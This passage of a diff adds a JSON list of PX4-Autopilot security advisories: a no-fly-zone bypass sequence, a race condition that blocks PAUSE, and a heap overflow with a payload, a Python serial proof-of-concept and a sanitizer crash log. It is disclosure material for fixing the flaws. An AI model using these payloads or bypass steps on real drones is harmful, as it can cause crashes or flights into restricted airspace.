is dysfunctional.\r\n- Due to this vulnerability, users may unintentionally or intentionally execute missions within the no-fly zone after performing the following sequence of actions: triggering the vulnerability to bypass mission feasibility check, uploading waypoints within the no-fly zone, setting the home point within the no-fly zone, turn to return mode to bring the drone into the no-fly zone, and then switching to mission mode, causing the drone to execute the mission within the no-fly zone starting from the nearest waypoint.\r\n\r\nhttps://user-images.githubusercontent.com/151698793/295128951-3176e8fc-60ab-49e9-9dd3-4ef64523c62d.mp4\r\n\r\n\r\n\r\n\r\n",
+    "severity": "high",
+    "author": null,
+    "publisher": {
+      "login": "bkueng",
+      "id": 281593,
+      "node_id": "MDQ6VXNlcjI4MTU5Mw==",
+      "avatar_url": "https://avatars.githubusercontent.com/u/281593?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/bkueng",
+      "html_url": "https://github.com/bkueng",
+      "followers_url": "https://api.github.com/users/bkueng/followers",
+      "following_url": "https://api.github.com/users/bkueng/following{/other_user}",
+      "gists_url": "https://api.github.com/users/bkueng/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/bkueng/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/bkueng/subscriptions",
+      "organizations_url": "https://api.github.com/users/bkueng/orgs",
+      "repos_url": "https://api.github.com/users/bkueng/repos",
+      "events_url": "https://api.github.com/users/bkueng/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/bkueng/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-p74g-gvg5-6pgc",
+        "type": "GHSA"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2024-03-14T07:31:50Z",
+    "published_at": "2024-03-14T07:31:50Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pixhawk ",
+          "name": "PX4-Autopilot"
+        },
+        "vulnerable_version_range": "1.14.0",
+        "patched_versions": "",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:N/I:H/A:H",
+        "score": 8.1
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-362",
+        "name": "Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-362"
+    ],
+    "credits": [
+      {
+        "login": "Drone-Lab",
+        "type": "reporter"
+      },
+      {
+        "login": "czbxzm",
+        "type": "coordinator"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "Drone-Lab",
+          "id": 151698793,
+          "node_id": "U_kgDOCQq9aQ",
+          "avatar_url": "https://avatars.githubusercontent.com/u/151698793?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/Drone-Lab",
+          "html_url": "https://github.com/Drone-Lab",
+          "followers_url": "https://api.github.com/users/Drone-Lab/followers",
+          "following_url": "https://api.github.com/users/Drone-Lab/following{/other_user}",
+          "gists_url": "https://api.github.com/users/Drone-Lab/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/Drone-Lab/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/Drone-Lab/subscriptions",
+          "organizations_url": "https://api.github.com/users/Drone-Lab/orgs",
+          "repos_url": "https://api.github.com/users/Drone-Lab/repos",
+          "events_url": "https://api.github.com/users/Drone-Lab/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/Drone-Lab/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      },
+      {
+        "user": {
+          "login": "czbxzm",
+          "id": 42442851,
+          "node_id": "MDQ6VXNlcjQyNDQyODUx",
+          "avatar_url": "https://avatars.githubusercontent.com/u/42442851?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/czbxzm",
+          "html_url": "https://github.com/czbxzm",
+          "followers_url": "https://api.github.com/users/czbxzm/followers",
+          "following_url": "https://api.github.com/users/czbxzm/following{/other_user}",
+          "gists_url": "https://api.github.com/users/czbxzm/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/czbxzm/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/czbxzm/subscriptions",
+          "organizations_url": "https://api.github.com/users/czbxzm/orgs",
+          "repos_url": "https://api.github.com/users/czbxzm/repos",
+          "events_url": "https://api.github.com/users/czbxzm/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/czbxzm/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "coordinator",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 4,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:N/I:H/A:H",
+      "score": 8.1
+    }
+  },
+  {
+    "ghsa_id": "GHSA-x57h-c282-63hg",
+    "cve_id": null,
+    "url": "https://api.github.com/repos/PX4/PX4-Autopilot/security-advisories/GHSA-x57h-c282-63hg",
+    "html_url": "https://github.com/PX4/PX4-Autopilot/security/advisories/GHSA-x57h-c282-63hg",
+    "summary": "[REPORT]Multi-Threaded Race Condition bug found in src/modules/navigator/navigator_main.cpp which cause drone can not PAUSE",
+    "description": "### Summary\r\nDue to the lack of synchronization mechanism for vehicle_status variable,we identified a Race Condition  vulnerability in the navigator_main.cpp and commander.cpp.This will result in the drone not being able to PAUSE when it executes a mission.\r\n\r\n### Details\r\nWhen the drone is executing a mission and the user clicks PAUSE, the ground control station will send **command::VEHICLE_CMD_DO_REPOSITION** to the drone.\r\n1. In commander.cpp, the drone state is modified to **NAVIGATION_STATE_AUTO_LOITER** based on the received commands and the state is published.\r\nAs stated in the code comment, it is designed not to require the navigator and command to receive/process data at the **exact same** time.\r\nhttps://github.com/PX4/PX4-Autopilot/blob/24cee812795c669318d3e56e5df9261124e319a7/src/modules/commander/Commander.cpp#L726-L731\r\n\r\n2. In navigator_main.cpp, it will subscribe to the drone status and execute **status->run()**\r\nhttps://github.com/PX4/PX4-Autopilot/blob/24cee812795c669318d3e56e5df9261124e319a7/src/modules/navigator/navigator_main.cpp#L881\r\n\r\n3. Some of the parameters needed in **status->run()** are also calculated in navigator_main.cpp, but the conditions that trigger the execution of these calculated functions are not based on the drone status but on the received commander.Here calculate the break point to pause the mission.\r\nhttps://github.com/PX4/PX4-Autopilot/blob/24cee812795c669318d3e56e5df9261124e319a7/src/modules/navigator/navigator_main.cpp#L345-L351\r\nMulti-Threaded Race Condition occurs here.When navigator_main.cpp receives the command from the GCS and calculates the braking point, commander.cpp hasn't yet modified the UAV's status according to the received command, so **status->run()**,doesn't publish the braking point as expected\r\n\r\n   By the time commander.cpp finishes modifying the drone's status, navigator_main.cpp has executed to the next round and overwritten the brake point it just calculated, causing **status->run()** (status==loiter) to PUBLISH the wrong data\r\n\r\n4. Here overwrite the brake point.Because the Pause command is a compound command.\r\nPause command==reposition to break point+change altitude\r\nI analyzed the QGC code, and when the user presses the PAUSE button, QGC sends twice the REPOSITION CMD to the drone.The second REPOSITION CMD triggers here and cause overwrite.\r\nhttps://github.com/PX4/PX4-Autopilot/blob/f38fe24a98e05e5ecada347c32e108a12afb03aa/src/modules/navigator/navigator_main.cpp#L331-L334\r\n\r\n### Verification\r\nI added some debug output to watch the drone's state change.\r\n\r\n```\r\n// Navigator.cpp\r\n\r\nWHILE true DO\r\n    IF vehicle_command_s EQUALS VEHICLE_CMD_DO_reposition THEN\r\n        PX4_INFO(\"VEHICLE_CMD_DO_REPOSITION\")\r\n        IF user_intent EQUALS pause THEN\r\n            PX4_INFO(\"calculate_breaking_stop point\")\r\n            calculate_breaking_stop(rep.current.lat, rep.current.lon, rep.current.yaw)\r\n        END IF\r\n    END IF\r\n\r\n    PX4_INFO(\"Now vehicle_status=missison/loiter\") //output drone status\r\n    vehicle_status_s.Run() // If status EQUALS loiter, publish the break point\r\nEND WHILE\r\n\r\n\r\n```\r\nWhen the drone is executing a mission and the user clicks PAUSE,the console will output the following content:\r\n\r\n```\r\n...\r\nINFO  [navigator] Now  vehicle_status=missison    //The drone is on a mission.\r\nINFO  [navigator] Now  vehicle_status=missison\r\nINFO  [navigator] Now  vehicle_status=missison\r\nINFO  [navigator] VEHICLE_CMD_DO_REPOSITION     //Navigator_main.cpp accept CMD from GCS\r\nINFO  [navigator] calculate_breaking_stop point             \r\nINFO  [navigator] Now  vehicle_status=missison   //!!!!!!Beacuse of Race Condition,Drone is still in the previous status\r\nINFO  [navigator] VEHICLE_CMD_DO_REPOSITION   //Pause command==reposition to break point+change altitude,so here's the VEHICLE_CMD_DO_REPOSITION twice\r\nINFO  [navigator] Now vehicle_status=loiter  //Commander.cpp has modified status according to CMD\r\nINFO  [navigator] Now vehicle_status=loiter\r\nINFO  [navigator] Now vehicle_status=loiter\r\n...\r\n```\r\n### Temporary Patch\r\n\r\n\r\n```\r\nvehicle_command_s cmd{};\r\n_vehicle_command_sub.copy(&cmd);\r\nif(cmd.command == vehicle_command_s::VEHICLE_CMD_DO_REPOSITION){\r\n_navigation_mode=&_loiter;\r\n}\r\n```\r\nAdd code before this line,assure the status is consistent with CMD before executing status->run()\r\nhttps://github.com/PX4/PX4-Autopilot/blob/24cee812795c669318d3e56e5df9261124e319a7/src/modules/navigator/navigator_main.cpp#L881\r\n\r\n\r\n### Impact\r\n- Due to multiple threads accessing the 'vehicle_status' variable, one thread may experience simultaneous modifications by another thread, leading to a data race bug.\r\n- Drones are unable to PAUSE during missions, which can lead to collision crashes in the event of a hazardous encounter or incorrect mission settings.#22492\r\n\r\nhttps://user-images.githubusercontent.com/151698793/291232214-40734dab-363a-43ec-aa02-6f8bf177f3b4.mp4\r\n\r\n\r\n- After pause,the drone still keep move, but also in hold mode.So the user can not manually enter the hold to stop the aircraft, user need to switch to other modes then manually hold.\r\n- An attacker could use the vulnerability to keep the drone from executing certain commands.\r\n\r\n\r\n\r\n",
+    "severity": "high",
+    "author": null,
+    "publisher": {
+      "login": "bkueng",
+      "id": 281593,
+      "node_id": "MDQ6VXNlcjI4MTU5Mw==",
+      "avatar_url": "https://avatars.githubusercontent.com/u/281593?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/bkueng",
+      "html_url": "https://github.com/bkueng",
+      "followers_url": "https://api.github.com/users/bkueng/followers",
+      "following_url": "https://api.github.com/users/bkueng/following{/other_user}",
+      "gists_url": "https://api.github.com/users/bkueng/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/bkueng/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/bkueng/subscriptions",
+      "organizations_url": "https://api.github.com/users/bkueng/orgs",
+      "repos_url": "https://api.github.com/users/bkueng/repos",
+      "events_url": "https://api.github.com/users/bkueng/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/bkueng/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-x57h-c282-63hg",
+        "type": "GHSA"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2024-01-25T07:27:47Z",
+    "published_at": "2024-01-25T07:27:47Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pixhawk ",
+          "name": "PX4-Autopilot"
+        },
+        "vulnerable_version_range": "1.14.0",
+        "patched_versions": "",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:H",
+        "score": 8.2
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-362",
+        "name": "Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-362"
+    ],
+    "credits": [
+      {
+        "login": "Drone-Lab",
+        "type": "reporter"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "Drone-Lab",
+          "id": 151698793,
+          "node_id": "U_kgDOCQq9aQ",
+          "avatar_url": "https://avatars.githubusercontent.com/u/151698793?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/Drone-Lab",
+          "html_url": "https://github.com/Drone-Lab",
+          "followers_url": "https://api.github.com/users/Drone-Lab/followers",
+          "following_url": "https://api.github.com/users/Drone-Lab/following{/other_user}",
+          "gists_url": "https://api.github.com/users/Drone-Lab/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/Drone-Lab/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/Drone-Lab/subscriptions",
+          "organizations_url": "https://api.github.com/users/Drone-Lab/orgs",
+          "repos_url": "https://api.github.com/users/Drone-Lab/repos",
+          "events_url": "https://api.github.com/users/Drone-Lab/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/Drone-Lab/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 11,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:H",
+      "score": 8.2
+    }
+  },
+  {
+    "ghsa_id": "GHSA-5hvv-q2r5-rppw",
+    "cve_id": "CVE-2023-46256",
+    "url": "https://api.github.com/repos/PX4/PX4-Autopilot/security-advisories/GHSA-5hvv-q2r5-rppw",
+    "html_url": "https://github.com/PX4/PX4-Autopilot/security/advisories/GHSA-5hvv-q2r5-rppw",
+    "summary": "[REPORT] Heap Buffer Overflow Bug Found in src/drivers/distance_sensor/lightware_laser_serial/parser.cpp",
+    "description": "### Summary\r\nWe identified a heap buffer overflow vulnerability in the parser function due to the absence of `parserbuf_index` value checking.\r\nTarget code: [src/drivers/distance_sensor/lightware_laser_serial/parser.cpp:87](https://github.com/PX4/PX4-Autopilot/blob/main/src/drivers/distance_sensor/lightware_laser_serial/parser.cpp#L87).\r\n\r\nWe have investigated by the following process.\r\n\r\n1. We enabled the `lightware_laser_serial` driver.\r\n2. We wrote the arbitrary input to `readbuf` buffer used in `lightware_laser_serial::collect` function.\r\n3. The heap buffer overflow vulnerability had triggered in the `lightware_parser` function when it parses the data.\r\n\r\nWhen we send the following data, it can trigger the vulnerability.\r\n\r\n```python\r\npayload = b'\\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'\r\n```\r\n\r\n### Details\r\n1. We first assumed that we can write the arbitrary input into `readbuf`. We’ve found the corresponding code in [src/drivers/distance_sensor/lightware_laser_serial/lightware_laser_serial.cpp:175](https://github.com/PX4/PX4-Autopilot/blob/main/src/drivers/distance_sensor/lightware_laser_serial/lightware_laser_serial.cpp#L175).\r\n    \r\n    ```cpp\r\n    int ret = ::read(_fd, &readbuf[0], readlen);\r\n    ```\r\n    \r\n\r\n1. After then, it calls `lightware_parser` function to parse the read data at [src/drivers/distance_sensor/lightware_laser_serial/lightware_laser_serial.cpp:222](https://github.com/PX4/PX4-Autopilot/blob/main/src/drivers/distance_sensor/lightware_laser_serial/lightware_laser_serial.cpp#L222).\r\n    \r\n    ```cpp\r\n    if (OK == lightware_parser(readbuf[i], _linebuf, &_linebuf_index, &_parse_state, &distance_m)) {\r\n    ```\r\n    \r\n    - `readbuf`: 10 bytes sized buffer\r\n    - `_linebuf`: *LightwareLaserSerial* object’s 10 bytes sized buffer\r\n    - `_linebuf_index`: *LightwareLaserSerial* object’s `sizeof(unsigned)` sized the index of `_linebuf`\r\n    - `_parse_state`: state information ( initial value: `LW_PARSE_STATE0_UNSYNC` )\r\n    - `distance_m`: distance value\r\n\r\n1. In the `lightware_parser` function, `LW_PARSE_STATE2_GOT_DIGIT0` state can be repeated unexpectedly without proper `parserbuf_index` or `state` checking. This behavior will trigger a heap buffer overflow vulnerability by allowing to write some data. And the writable size is maximum value of an `unsigned int`\r\n    \r\n    ```cpp\r\n    int lightware_parser(char c, char *parserbuf, unsigned *parserbuf_index, enum LW_PARSE_STATE *state, float *dist)\r\n    {\r\n    \tint ret = -1;\r\n    \tchar *end;\r\n    \r\n    \tswitch (*state) {\r\n    \tcase LW_PARSE_STATE0_UNSYNC:               \r\n    \t\tif (c == '\\n') {\r\n    \t\t\t*state = LW_PARSE_STATE1_SYNC;         <--- [1]\r\n    \t\t\t(*parserbuf_index) = 0;\r\n    \t\t}\r\n    \r\n    \t\tbreak;\r\n    \r\n    \tcase LW_PARSE_STATE1_SYNC:                 \r\n    \t\tif (c >= '0' && c <= '9') {\r\n    \t\t\t*state = LW_PARSE_STATE2_GOT_DIGIT0;   <--- [2]\r\n    \t\t\tparserbuf[*parserbuf_index] = c;       \r\n    \t\t\t(*parserbuf_index)++;\r\n    \t\t}\r\n    \r\n    \t\tbreak;\r\n    \r\n    \tcase LW_PARSE_STATE2_GOT_DIGIT0:           \r\n    \t\tif (c >= '0' && c <= '9') {\r\n    \t\t\t*state = LW_PARSE_STATE2_GOT_DIGIT0;   <--- [3]\r\n    \t\t\tparserbuf[*parserbuf_index] = c;\r\n    \t\t\t(*parserbuf_index)++;\r\n    \r\n    \t\t} else if (c == '.') {\r\n    \t\t\t*state = LW_PARSE_STATE3_GOT_DOT;\r\n    \t\t\tparserbuf[*parserbuf_index] = c;\r\n    \t\t\t(*parserbuf_index)++;\r\n    \r\n    \t\t} else {\r\n    \t\t\t*state = LW_PARSE_STATE0_UNSYNC;\r\n    \t\t}\r\n    \r\n    \t\tbreak;\r\n    \r\n    \t\t//ommited\r\n    }\r\n    ```\r\n    \r\n    - After changing the state as [1] → [2] → [3], it repeats the state as `LW_PARSE_STATE2_GOT_DIGIT0` during the parsing data.\r\n    The problematic situation is caused by the absence of the proper `parserbuf_index` checking.\r\n\r\n\r\n\r\n### PoC\r\n#### Environment setting\r\n1. Create serial interfaces by `socat -d -d pty,raw,echo=0 pty,raw,echo=0` command.\r\n    1. In our case, serial interfaces was created on /dev/pts/2 and /dev/pts/4. The number of serial interfaces can be different on environment.\r\n2. Enable lightware_laser_serial driver by `make px4_sitl boardconfig` command.\r\n    1. drivers → distance sensors → lightware_laser_serial \r\n3. Execute SITL by `HEADLESS=1 PX4_ASAN=1 make px4_sitl jmavsim` command.\r\n4. On the pxh prompt, start lightware_laser_serial driver module by `lightware_laser_serial start -d /dev/pts/2` command.\r\n5. Execute the PoC code as below.\r\n\r\n>We have tested on Ubuntu 22.04.3 LTS.\r\n\r\n#### PoC Code\r\n```python\r\nimport serial\r\nimport time\r\n\r\nser = serial.Serial('/dev/pts/4')\r\nif ser.isOpen():\r\n    print('Connection success')\r\nelse:\r\n    print('Connection failed')\r\n    exit()\r\n\r\npayload = b'\\n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'\r\n\r\ntry:\r\n    ser.write(payload)\r\n    print(f'Sent: {payload}')\r\nexcept Exception as e:\r\n    print(f'Error: {e}')\r\n\r\nfinally:\r\n    ser.close()\r\n    print('Connection closed')\r\n```\r\n\r\n### Address Sanitizer Log\r\n![image](https://user-images.githubusercontent.com/42103354/273369557-faba0a47-43d6-46ea-9669-e94480326333.png)\r\n\r\n```bash\r\n=================================================================\r\n==79396==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x611000018240 at pc 0x561dbb3c24aa bp 0x7f76e1b724f0 sp 0x7f76e1b724e0\r\nWRITE of size 1 at 0x611000018240 thread T142\r\n    #0 0x561dbb3c24a9 in lightware_parser(char, char*, unsigned int*, LW_PARSE_STATE*, float*) /home/zeroone/PX4-Autopilot/src/drivers/distance_sensor/lightware_laser_serial/parser.cpp:87\r\n    #1 0x561dbb3c128f in LightwareLaserSerial::collect() /home/zeroone/PX4-Autopilot/src/drivers/distance_sensor/lightware_laser_serial/lightware_laser_serial.cpp:222\r\n    #2 0x561dbb3c1527 in LightwareLaserSerial::Run() /home/zeroone/PX4-Autopilot/src/drivers/distance_sensor/lightware_laser_serial/lightware_laser_serial.cpp:319\r\n    #3 0x561dbbc34096 in px4::WorkQueue::Run() /home/zeroone/PX4-Autopilot/platforms/common/px4_work_queue/WorkQueue.cpp:188\r\n    #4 0x561dbbc34f52 in WorkQueueRunner /home/zeroone/PX4-Autopilot/platforms/common/px4_work_queue/WorkQueueManager.cpp:238\r\n    #5 0x7f76e4e94ac2 in start_thread nptl/pthread_create.c:442\r\n    #6 0x7f76e4f26a3f  (/lib/x86_64-linux-gnu/libc.so.6+0x126a3f)\r\n\r\n0x611000018240 is located 0 bytes to the right of 256-byte region [0x611000018140,0x611000018240)\r\nallocated by thread T0 here:\r\n    #0 0x7f76e60b61e7 in operator new(unsigned long) ../../../../src/libsanitizer/asan/asan_new_delete.cpp:99\r\n    #1 0x561dbb3c0466 in start /home/zeroone/PX4-Autopilot/src/drivers/distance_sensor/lightware_laser_serial/lightware_laser_serial_main.cpp:57\r\n    #2 0x561dbb3c0466 in lightware_laser_serial_main /home/zeroone/PX4-Autopilot/src/drivers/distance_sensor/lightware_laser_serial/lightware_laser_serial_main.cpp:158\r\n    #3 0x561dbbc50307  (/home/zeroone/PX4-Autopilot/build/px4_sitl_default/bin/px4+0x9f6307)\r\n\r\nThread T142 created by T5 here:\r\n    #0 0x7f76e6058685 in __interceptor_pthread_create ../../../../src/libsanitizer/asan/asan_interceptors.cpp:216\r\n    #1 0x561dbbc35620 in WorkQueueManagerRun /home/zeroone/PX4-Autopilot/platforms/common/px4_work_queue/WorkQueueManager.cpp:324\r\n\r\nThread T5 created by T0 here:\r\n    #0 0x7f76e6058685 in __interceptor_pthread_create ../../../../src/libsanitizer/asan/asan_interceptors.cpp:216\r\n    #1 0x561dbbc30041 in px4_task_spawn_cmd /home/zeroone/PX4-Autopilot/platforms/posix/src/px4/common/tasks.cpp:252\r\n\r\nSUMMARY: AddressSanitizer: heap-buffer-overflow /home/zeroone/PX4-Autopilot/src/drivers/distance_sensor/lightware_laser_serial/parser.cpp:87 in lightware_parser(char, char*, unsigned int*, LW_PARSE_STATE*, float*)\r\nShadow bytes around the buggy address:\r\n  0x0c227fffaff0: 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa\r\n  0x0c227fffb000: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd\r\n  0x0c227fffb010: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd\r\n  0x0c227fffb020: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00\r\n  0x0c227fffb030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\r\n=>0x0c227fffb040: 00 00 00 00 00 00 00 00[fa]fa fa fa fa fa fa fa\r\n  0x0c227fffb050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\n  0x0c227fffb060: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\n  0x0c227fffb070: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\n  0x0c227fffb080: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\n  0x0c227fffb090: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\nShadow byte legend (one shadow byte represents 8 application bytes):\r\n  Addressable:           00\r\n  Partially addressable: 01 02 03 04 05 06 07 \r\n  Heap left redzone:       fa\r\n  Freed heap region:       fd\r\n  Stack left redzone:      f1\r\n  Stack mid redzone:       f2\r\n  Stack right redzone:     f3\r\n  Stack after return:      f5\r\n  Stack use after scope:   f8\r\n  Global redzone:          f9\r\n  Global init order:       f6\r\n  Poisoned by user:        f7\r\n  Container overflow:      fc\r\n  Array cookie:            ac\r\n  Intra object redzone:    bb\r\n  ASan internal:           fe\r\n  Left alloca redzone:     ca\r\n  Right alloca redzone:    cb\r\n  Shadow gap:              cc\r\n==79396==ABORTING\r\n```\r\n\r\n### Recommended Patch\r\n```cpp\r\nint lightware_parser(char c, char *parserbuf, unsigned *parserbuf_index, enum LW_PARSE_STATE *state, float *dist)\r\n{\r\n\tint ret = -1;\r\n\tchar *end;\r\n\r\n\tswitch (*state) {\r\n\tcase LW_PARSE_STATE0_UNSYNC:\r\n\t\tif (c == '\\n') {\r\n\t\t\t*state = LW_PARSE_STATE1_SYNC;         \r\n\t\t\t(*parserbuf_index) = 0;\r\n\t\t}\r\n\r\n\t\tbreak;\r\n\r\n\tcase LW_PARSE_STATE1_SYNC:\r\n\t\tif (c >= '0' && c <= '9') {\r\n\t\t\t*state = LW_PARSE_STATE2_GOT_DIGIT0;\r\n\t\t\tparserbuf[*parserbuf_index] = c;       \r\n\t\t\t(*parserbuf_index)++;\r\n\t\t}\r\n\r\n\t\tbreak;\r\n\r\n\tcase LW_PARSE_STATE2_GOT_DIGIT0:\r\n\t\tif (c >= '0' && c <= '9') {\r\n\t\t\tif ( *parserbuf_index > 6 ) {        <--- [1] should not be bigger than 6\r\n\t\t\t\t*state = LW_PARSE_STATE0_UNSYNC;  \r\n\r\n\t\t\t}else {\r\n\t\t\t\t*state = LW_PARSE_STATE2_GOT_DIGIT0;\r\n\t\t\t\tparserbuf[*parserbuf_index] = c;\r\n\t\t\t\t(*parserbuf_index)++;\r\n\t\t\t}\r\n\r\n\t\t} else if (c == '.') {\r\n\t\t\t*state = LW_PARSE_STATE3_GOT_DOT;\r\n\t\t\tparserbuf[*parserbuf_index] = c;\r\n\t\t\t(*parserbuf_index)++;\r\n\r\n\t\t} else {\r\n\t\t\t*state = LW_PARSE_STATE0_UNSYNC;\r\n\t\t}\r\n\r\n\t\tbreak;\r\n\r\n\t\t//ommited\r\n}\r\n```\r\n\r\n- After the state becomes `LW_PARSE_STATE2_GOT_DIGIT0`, the increment operation of `parserbuf_index` can be done 3 times. Considering the size of `readline` is 10 bytes, the `parserbuf_index` value shouldn’t be bigger than 9.\r\n- So, we recommend to patch by adding a checking logic whether `parserbuf_index` is bigger than 6. If `parserbuf_index` value is bigger than 6, the state must be initialized with `LW_PARSE_STATE0_UNSYNC`.\r\n\r\n\r\n\r\n### Impact\r\n- A malfunction of the sensor device can cause a heap buffer overflow with leading unexpected drone behavior.\r\n- Malicious applications can exploit the vulnerability even if device sensor malfunction does not occur.\r\n- Up to  maximum value of an `unsigned int` bytes sized data can be written to the heap memory area.\r\n",
+    "severity": "medium",
+    "author": null,
+    "publisher": {
+      "login": "mrpollo",
+      "id": 317648,
+      "node_id": "MDQ6VXNlcjMxNzY0OA==",
+      "avatar_url": "https://avatars.githubusercontent.com/u/317648?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/mrpollo",
+      "html_url": "https://github.com/mrpollo",
+      "followers_url": "https://api.github.com/users/mrpollo/followers",
+      "following_url": "https://api.github.com/users/mrpollo/following{/other_user}",
+      "gists_url": "https://api.github.com/users/mrpollo/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/mrpollo/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/mrpollo/subscriptions",
+      "organizations_url": "https://api.github.com/users/mrpollo/orgs",
+      "repos_url": "https://api.github.com/users/mrpollo/repos",
+      "events_url": "https://api.github.com/users/mrpollo/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/mrpollo/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-5hvv-q2r5-rppw",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2023-46256",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2023-10-30T19:57:51Z",
+    "published_at": "2023-10-30T19:42:36Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": ""
+        },
+        "vulnerable_version_range": "<=1.14.0-rc1",
+        "patched_versions": "",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:L/I:N/A:L",
+        "score": 4.4
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-122",
+        "name": "Heap-based Buffer Overflow"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-122"
+    ],
+    "credits": [
+      {
+        "login": "zeroone-kr",
+        "type": "reporter"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "zeroone-kr",
+          "id": 42103354,
+          "node_id": "MDQ6VXNlcjQyMTAzMzU0",
+          "avatar_url": "https://avatars.githubusercontent.com/u/42103354?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/zeroone-kr",
+          "html_url": "https://github.com/zeroone-kr",
+          "followers_url": "https://api.github.com/users/zeroone-kr/followers",
+          "following_url": "https://api.github.com/users/zeroone-kr/following{/other_user}",
+          "gists_url": "https://api.github.com/users/zeroone-kr/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/zeroone-kr/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/zeroone-kr/subscriptions",
+          "organizations_url": "https://api.github.com/users/zeroone-kr/orgs",
+          "repos_url": "https://api.github.com/users/zeroone-kr/repos",
+          "events_url": "https://api.github.com/users/zeroone-kr/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/zeroone-kr/received_events",
+          "type": "User",
